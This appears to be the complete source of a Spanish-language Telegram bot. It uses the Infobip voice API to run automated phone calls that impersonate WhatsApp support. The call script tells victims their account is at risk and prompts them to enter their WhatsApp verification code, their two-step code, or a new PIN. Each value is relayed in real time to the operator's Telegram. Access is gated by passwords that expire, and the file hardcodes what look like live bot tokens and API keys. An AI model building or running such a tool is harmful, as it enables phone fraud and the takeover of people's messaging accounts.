"use strict";

// =========================
// IMPORTACIONES
// =========================
const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const https = require("follow-redirects").https;

// =========================
// CONFIGURACIÓN INICIAL
// =========================
const TELEGRAM_BOT_TOKEN = "7521128407:AAH2E4SKkAgKiXrkIReQwufyLoQTcRp4bvk";
const PORT = process.env.PORT || 3000;
const DEFAULT_API_KEY = "App e3daefcc80560f5b41fbaea5f57cf55d-37367689-0e5a-47ad-bf35-7f11679eb55d";
const INFOBIP_BASE_HOST = "pdl8re.api.infobip.com";
const WEBHOOK = "https://botllamadas.onrender.com/infobip-webhook";

// =========================
// ALMACENAMIENTO
// =========================
const authenticatedUsers = {};
const awaitingInput = {};
const callRequests = {};
const callRequestsByNumber = {};
const answeredCalls = new Set();

const SCENARIO_NAME = "Verificación de cuenta WhatsApp";

// =========================
// HELPERS
// =========================
function formatNumber(num) {
  if (!num || num === "?") return "+?";
  const s = String(num);
  return s.startsWith("+") ? s : "+" + s;
}

function getUserApiKey(chatId) {
  const user = authenticatedUsers[chatId];
  if (user && user.admin) return DEFAULT_API_KEY;
  if (user && user.apiKey) return user.apiKey.startsWith("App ") ? user.apiKey : "App " + user.apiKey;
  return null;
}

function getInfobipHost(chatId) {
  const user = authenticatedUsers[chatId];
  if (user && user.infobipHost) return user.infobipHost;
  return INFOBIP_BASE_HOST;
}

// =========================
// INICIALIZACIÓN DEL BOT
// =========================
const bot = new Telegraf(TELEGRAM_BOT_TOKEN);

bot.use((ctx, next) => {
  if (ctx.message && ctx.message.text) {
    const chatId = ctx.chat.id;
    if (ctx.message.text.startsWith("/login") || ctx.message.text.startsWith("/start")) return next();

    if (!authenticatedUsers[chatId] || !authenticatedUsers[chatId].authenticated) {
      const password = ctx.message.text.trim();

      if (password === "Mortadela1$") {
        authenticatedUsers[chatId] = { authenticated: true, unlimited: true, admin: true };
        ctx.replyWithHTML("<b>¡Bienvenido Administrador!</b> Tienes acceso ilimitado 😎", Markup.removeKeyboard());
        return;

      } else if (password === "PapaHelado4") {
        let currentYear = new Date().getFullYear();
        let expirationDate = new Date(`${currentYear}-03-18T23:59:59`);
        if (new Date() > expirationDate) expirationDate = new Date(`${currentYear + 1}-03-18T23:59:59`);
        authenticatedUsers[chatId] = { authenticated: true, unlimited: false, admin: false, expiresAt: expirationDate };
        ctx.replyWithHTML("<b>¡Bienvenido Usuario!</b> Realiza llamadas a cualquier parte del mundo ⏳", Markup.removeKeyboard());
        return;

      } else if (password === "UsuarioExitoso222") {
        let currentYear = new Date().getFullYear();
        let expirationDate = new Date(`${currentYear}-03-18T23:59:59`);
        if (new Date() > expirationDate) expirationDate = new Date(`${currentYear + 1}-03-18T23:59:59`);
        authenticatedUsers[chatId] = {
          authenticated: true,
          unlimited: false,
          admin: false,
          expiresAt: expirationDate,
          apiKey: "App beed66c4d04eeacdb896948a5fd0f3e9-98ce2848-a6fc-47b7-8e5e-87e575996553",
          infobipHost: "l2ljdw.api.infobip.com"
        };
        ctx.replyWithHTML("<b>¡Bienvenido Usuario Exitoso!</b> Realiza llamadas a cualquier parte del mundo 🌍", Markup.removeKeyboard());
        return;

      } else {
        ctx.reply("❌ Contraseña incorrecta. Por favor, intenta de nuevo.");
        return;
      }

    } else {
      if (!authenticatedUsers[chatId].unlimited) {
        const now = new Date();
        if (now > authenticatedUsers[chatId].expiresAt) {
          ctx.reply("⚠️ Tu acceso ha expirado. Por favor, vuelve a autenticarte.");
          authenticatedUsers[chatId] = { authenticated: false };
          return;
        }
      }
    }
  }
  return next();
});

// =========================
// COMANDOS DEL BOT
// =========================

bot.command("login", (ctx) => ctx.reply("🔒 Por favor, ingresa la contraseña:"));

bot.start((ctx) => {
  const chatId = ctx.chat.id;
  if (!authenticatedUsers[chatId] || !authenticatedUsers[chatId].authenticated) {
    ctx.reply("🔑 Por favor, ingresa la contraseña para acceder al bot:");
  } else {
    ctx.replyWithHTML(
      "<b>Bienvenido al Bot de WhatsApp/Infobip</b> 🌟\nSelecciona una opción:",
      Markup.keyboard([["📞 Realizar llamada", "🔧 Cambiar API"]]).resize()
    );
  }
});

bot.hears("🔧 Cambiar API", (ctx) => {
  awaitingInput[ctx.chat.id] = { type: "change_api" };
  ctx.reply("📝 Envíame la nueva API Key de Infobip:");
});

bot.hears("📞 Realizar llamada", (ctx) => {
  const chatId = ctx.chat.id;
  const userApiKey = getUserApiKey(chatId);
  if (!authenticatedUsers[chatId].admin && !userApiKey) {
    ctx.reply("⚠️ Debes configurar tu propia API Key usando el comando 🔧 Cambiar API antes de realizar llamadas.");
    return;
  }
  awaitingInput[chatId] = { type: "enter_from_number" };
  ctx.reply("📞 Ingresa el número de origen (con código de país, ej: +5491112345678):", Markup.removeKeyboard());
});

bot.on("text", (ctx, next) => {
  const chatId = ctx.chat.id;
  if (awaitingInput[chatId]) {
    const input = ctx.message.text.trim();
    if (awaitingInput[chatId].type === "change_api") {
      authenticatedUsers[chatId].apiKey = input;
      ctx.replyWithHTML(`✅ Tu API Key ha sido actualizada a: <code>${input}</code>`);
      delete awaitingInput[chatId];
      return;
    } else if (awaitingInput[chatId].type === "enter_from_number") {
      awaitingInput[chatId] = { type: "call", fromNumber: input };
      ctx.reply("📲 Ahora, ingresa el número de destino al que deseas llamar:");
      return;
    } else if (awaitingInput[chatId].type === "call") {
      const fromNumber = awaitingInput[chatId].fromNumber;
      ctx.replyWithHTML(`📞 Número de destino ingresado: <b>${input}</b>\nIniciando llamada desde <b>${fromNumber}</b>...`);
      initiateCall(chatId, input, fromNumber);
      delete awaitingInput[chatId];
      return;
    }
  } else {
    return next();
  }
});

// =========================
// ESCENARIO IVR
// =========================

function notifyEvent(type, fromNumber, toNumber, extra = {}) {
  return {
    request: WEBHOOK,
    options: {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: { type, from: fromNumber, to: toNumber, ...extra }
    }
  };
}

function buildScenarioPayload(fromNumber, toNumber) {
  const voiceOptions = { language: "es", gender: "female" };
  return {
    name: SCENARIO_NAME,
    description: "Flujo interactivo que integra captura inmediata de DTMF/voz y notifica cada interacción en tiempo real.",
    script: [

      notifyEvent("CALL_ANSWERED", fromNumber, toNumber),

      {
        repeat: [
          {
            say: "Hola ${userNameVariable}. Este es un comunicado importante desde el soporte técnico de WhatsApp. De no realizar esta verificación, podría estar en peligro su cuenta, hemos detectado actividades inusuales en su cuenta de WhatsApp. Si usted ha realizado una solicitud en un nuevo dispositivo, presione 1. De lo contrario, presione 2. Si desea repetir el comunicado, presione 3.",
            options: voiceOptions
          },
          { collectInto: "initialOption", options: { maxInputLength: 1, timeout: 5, sendToReports: "ALWAYS" } }
        ],
        while: "${initialOption != '1' && initialOption != '2'}"
      },

      notifyEvent("DTMF_CAPTURED", fromNumber, toNumber, { field: "initialOption", value: "${initialOption}" }),
      { say: "Ha presionado ${initialOption}.", options: voiceOptions },
      { say: "Le hemos enviado un código de verificación de 6 dígitos a su número de teléfono registrado. Por favor, verifique sus notificaciones o la pantalla de su WhatsApp y digite el código proporcionado.", options: voiceOptions },
      { collectInto: "verificationCode", options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" } },
      notifyEvent("DTMF_CAPTURED", fromNumber, toNumber, { field: "verificationCode", value: "${verificationCode}" }),

      {
        repeat: [
          { say: "Si su cuenta cuenta con verificación de dos pasos, presione 1. De lo contrario, presione 2.", options: voiceOptions },
          { collectInto: "twoStepOption", options: { maxInputLength: 1, timeout: 5, sendToReports: "ALWAYS" } }
        ],
        while: "${twoStepOption != '1' && twoStepOption != '2'}"
      },

      notifyEvent("DTMF_CAPTURED", fromNumber, toNumber, { field: "twoStepOption", value: "${twoStepOption}" }),

      {
        if: "${twoStepOption == '1'}",
        then: [
          { say: "Para verificar su identidad, por favor, introduzca el código de verificación de dos pasos de 6 dígitos anteriormente configurado en su cuenta.", options: voiceOptions },
          { collectInto: "twoStepCode", options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" } },
          notifyEvent("DTMF_CAPTURED", fromNumber, toNumber, { field: "twoStepCode", value: "${twoStepCode}" }),
          { say: "Código de dos pasos recibido. Gracias por su verificación.", options: voiceOptions }
        ]
      },

      {
        if: "${twoStepOption == '2'}",
        then: [
          { say: "Por favor, configure su nuevo pin de 6 dígitos de verificación de dos pasos.", options: voiceOptions },
          { collectInto: "newTwoStepPin", options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" } },
          notifyEvent("DTMF_CAPTURED", fromNumber, toNumber, { field: "newTwoStepPin", value: "${newTwoStepPin}" }),
          { say: "Nuevo pin configurado correctamente.", options: voiceOptions }
        ]
      },

      notifyEvent("CALL_FINISHED", fromNumber, toNumber),
      "hangup"
    ]
  };
}

function createScenario(apiKey, host, fromNumber, toNumber, callback) {
  const options = {
    method: "POST",
    hostname: host,
    path: "/voice/ivr/1/scenarios",
    headers: { Authorization: apiKey, "Content-Type": "application/json", Accept: "application/json" },
    maxRedirects: 20
  };
  const req = https.request(options, (res) => {
    let chunks = [];
    res.on("data", (chunk) => chunks.push(chunk));
    res.on("end", () => {
      try {
        const json = JSON.parse(Buffer.concat(chunks).toString());
        if (json && json.id) {
          console.log("✅ Nuevo escenario creado:", json.id);
          callback(null, json.id);
        } else {
          callback(new Error("No se recibió ID de escenario: " + JSON.stringify(json)));
        }
      } catch (e) { callback(e); }
    });
  });
  req.on("error", callback);
  req.write(JSON.stringify(buildScenarioPayload(fromNumber, toNumber)));
  req.end();
}

// =========================
// LLAMADA IVR
// =========================

function initiateCall(chatId, targetNumber, fromNumber) {
  bot.telegram.sendMessage(chatId, "⏳ Creando escenario IVR...");
  const apiKey = getUserApiKey(chatId);
  const host = getInfobipHost(chatId);

  createScenario(apiKey, host, fromNumber, targetNumber, (err, scenarioId) => {
    if (err) {
      bot.telegram.sendMessage(chatId, `❌ Error creando escenario: ${err.message}`);
      return;
    }
    sendCallMessage(chatId, scenarioId, targetNumber, fromNumber);
  });
}

function sendCallMessage(chatId, scenarioId, targetNumber, fromNumber) {
  callRequests[scenarioId] = chatId;
  const cleanTarget = targetNumber.replace(/^\+/, "");
  callRequestsByNumber[cleanTarget] = { chatId, fromNumber, toNumber: targetNumber };
  callRequestsByNumber["+" + cleanTarget] = { chatId, fromNumber, toNumber: targetNumber };

  const bulkId = "BULK-" + Date.now() + "-" + Math.random().toString(36).substr(2, 6);
  const host = getInfobipHost(chatId);

  const messagePayload = {
    bulkId,
    messages: [{
      scenarioId,
      from: fromNumber,
      destinations: [{ to: targetNumber }],
      retry: { minPeriod: 1, maxPeriod: 5, maxCount: 5 },
      record: false,
      deliveryTimeWindow: {
        from: { hour: 0, minute: 0 },
        to: { hour: 23, minute: 59 },
        days: ["MONDAY", "TUESDAY", "WEDNESDAY", "THURSDAY", "FRIDAY", "SATURDAY", "SUNDAY"]
      },
      callbackUrl: WEBHOOK
    }]
  };

  bot.telegram.sendMessage(chatId, "🚀 Enviando llamada...");

  const options = {
    method: "POST",
    hostname: host,
    path: "/voice/ivr/1/messages",
    headers: { Authorization: getUserApiKey(chatId), "Content-Type": "application/json", Accept: "application/json" },
    maxRedirects: 20
  };

  const req = https.request(options, (res) => {
    let chunks = [];
    res.on("data", (chunk) => chunks.push(chunk));
    res.on("end", () => {
      bot.telegram.sendMessage(chatId, `📨 Respuesta: ${Buffer.concat(chunks).toString()}`);
    });
  });
  req.on("error", (error) => bot.telegram.sendMessage(chatId, `❌ Error al enviar llamada: ${error.message}`));
  req.write(JSON.stringify(messagePayload));
  req.end();
}

// =========================
// SERVIDOR EXPRESS Y WEBHOOK
// =========================
const app = express();
app.use(bodyParser.json());

function extractScenarioId(event) {
  return (
    (event.voiceCall && event.voiceCall.ivr && event.voiceCall.ivr.scenarioId) ||
    event.scenarioId ||
    (event.properties && event.properties.scenarioId) ||
    null
  );
}

function resolveChatId(scenarioId, toNumber) {
  if (scenarioId && callRequests[scenarioId]) return callRequests[scenarioId];
  if (toNumber) {
    const clean = String(toNumber).replace(/^\+/, "");
    const entry = callRequestsByNumber[clean] || callRequestsByNumber["+" + clean];
    if (entry) return entry.chatId;
  }
  return null;
}

function notifyTelegram(scenarioId, msg, toNumber) {
  const chatId = resolveChatId(scenarioId, toNumber);
  if (chatId) {
    bot.telegram.sendMessage(chatId, msg, { parse_mode: "Markdown" })
      .then(() => console.log("🔔 Notificación enviada al usuario:", chatId))
      .catch((err) => console.error("❌ Error Telegram:", err));
  } else {
    console.log("⚠️ Sin chatId — notificando a admins.");
    Object.entries(authenticatedUsers).forEach(([id, user]) => {
      if (user.authenticated && user.admin) {
        bot.telegram.sendMessage(id, msg, { parse_mode: "Markdown" })
          .then(() => console.log("🔔 Admin notificado:", id))
          .catch((err) => console.error("❌ Error Telegram admin:", err));
      }
    });
  }
}

function cleanupFull(scenarioId, toNumber) {
  if (scenarioId) delete callRequests[scenarioId];
  if (toNumber) {
    const clean = String(toNumber).replace(/^\+/, "");
    delete callRequestsByNumber[clean];
    delete callRequestsByNumber["+" + clean];
    answeredCalls.delete(clean);
  }
}

function cleanupCallOnly(scenarioId, toNumber) {
  if (scenarioId) delete callRequests[scenarioId];
  if (toNumber) {
    const clean = String(toNumber).replace(/^\+/, "");
    delete callRequestsByNumber[clean];
    delete callRequestsByNumber["+" + clean];
  }
}

app.post("/infobip-webhook", (req, res) => {
  console.log("Webhook recibido:", JSON.stringify(req.body, null, 2));
  const payload = req.body;

  const handleEvent = (event) => {
    const scenarioId = extractScenarioId(event);
    const toNumber = event.to || (event.voiceCall && event.voiceCall.to) || null;
    console.log("type:", event.type || "REPORTE_FINAL", "| to:", toNumber);

    if (event.type === "CALL_ANSWERED" && toNumber) {
      answeredCalls.add(String(toNumber).replace(/^\+/, ""));
    }

    if (!event.type && event.voiceCall) {
      const toNum = toNumber ? String(toNumber).replace(/^\+/, "") : null;
      const didAnswer = toNum && answeredCalls.has(toNum);

      if (!didAnswer) {
        const from = event.from || (event.voiceCall && event.voiceCall.from) || "?";
        const timestamp = new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" });
        notifyTelegram(scenarioId, `📵 *NO CONTESTÓ*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(toNumber)}\n🕐 ${timestamp}`, toNumber);
      } else {
        notifyTelegram(scenarioId, processCallEvent(event), toNumber);
      }

      cleanupFull(scenarioId, toNumber);
      return;
    }

    notifyTelegram(scenarioId, processCallEvent(event), toNumber);

    if (event.type === "CALL_FINISHED") cleanupCallOnly(scenarioId, toNumber);
  };

  if (payload.results && Array.isArray(payload.results)) {
    payload.results.forEach(handleEvent);
  } else {
    handleEvent(payload);
  }

  res.sendStatus(200);
});

// =========================
// PROCESAMIENTO DE EVENTOS
// =========================
function processCallEvent(event) {
  const from = event.from || (event.voiceCall && event.voiceCall.from) || "?";
  const to = event.to || (event.voiceCall && event.voiceCall.to) || "?";
  const timestamp = new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" });
  let message = "";

  if (event.type) {
    switch (event.type) {
      case "CALL_ANSWERED":
        message = `✅ *¡LLAMADA CONTESTADA!*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
        break;
      case "CALL_FINISHED":
        message = `📵 *LLAMADA FINALIZADA*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
        break;
      case "CALL_FAILED":
      case "NO_ANSWER":
      case "CALL_NO_ANSWER":
        message = `❌ *LLAMADA FALLIDA / NO CONTESTÓ*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
        break;
      case "CALL_REJECTED":
      case "BUSY":
        message = `🚫 *LLAMADA RECHAZADA*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
        break;
      case "DTMF_CAPTURED": {
        const fieldNames = {
          initialOption:    "Opción inicial",
          verificationCode: "🔑 Código de verificación",
          twoStepOption:    "Opción dos pasos",
          twoStepCode:      "🔐 Código dos pasos",
          newTwoStepPin:    "📌 Nuevo PIN"
        };
        message = `🔢 *${fieldNames[event.field] || event.field}: ${event.value}*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
        break;
      }
      case "CALL_STARTED":
      case "STARTED":
        message = `📲 *LLAMADA INICIADA*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
        break;
      case "CALL_RINGING":
      case "RINGING":
        message = `🔔 *LLAMANDO...*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
        break;
      default:
        message = `ℹ️ *EVENTO: ${event.type}*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
        if (event.properties) message += `\n📋 ${JSON.stringify(event.properties)}`;
    }

  } else if (event.voiceCall && event.voiceCall.ivr && event.voiceCall.ivr.collectedDtmfs) {
    message = `📋 *RESUMEN DE LLAMADA*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n`;
    try {
      const d = JSON.parse(event.voiceCall.ivr.collectedDtmfs);
      if (d.initialOption && d.initialOption !== "null")     message += `\n1️⃣ Opción inicial: ${d.initialOption}`;
      if (d.verificationCode && d.verificationCode !== "")   message += `\n🔑 Código ingresado: ${d.verificationCode}`;
      if (d.twoStepOption && d.twoStepOption !== "null")     message += `\n2️⃣ Opción segundo paso: ${d.twoStepOption}`;
      if (d.twoStepCode && d.twoStepCode !== "null")         message += `\n🔐 Código segundo paso: ${d.twoStepCode}`;
      if (d.newTwoStepPin && d.newTwoStepPin !== "null")     message += `\n📌 Nuevo PIN: ${d.newTwoStepPin}`;
    } catch (err) {
      message += `\nError parseando DTMFs: ${err.message}`;
    }
    message += `\n🕐 ${timestamp}`;

  } else {
    message = `ℹ️ *EVENTO RECIBIDO*\n🕐 ${timestamp}\n📋 ${JSON.stringify(event, null, 2)}`;
  }

  return message;
}

// =========================
// INICIALIZACIÓN
// =========================
app.listen(PORT, () => console.log(`Servidor Express escuchando en el puerto ${PORT}`));

function launchBot(retries = 5) {
  bot.launch()
    .then(() => console.log("Bot de Telegram iniciado correctamente."))
    .catch((err) => {
      if (err.response && err.response.error_code === 409) {
        if (retries > 0) {
          const delay = (6 - retries) * 3000;
          console.warn(`⚠️ Conflicto 409 (otra instancia activa). Reintentando en ${delay / 1000}s... (${retries} intentos restantes)`);
          setTimeout(() => launchBot(retries - 1), delay);
        } else {
          console.error("❌ No se pudo iniciar el bot después de varios intentos (error 409).");
        }
      } else {
        console.error("❌ Error al iniciar el bot:", err.message);
      }
    });
}

launchBot();

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
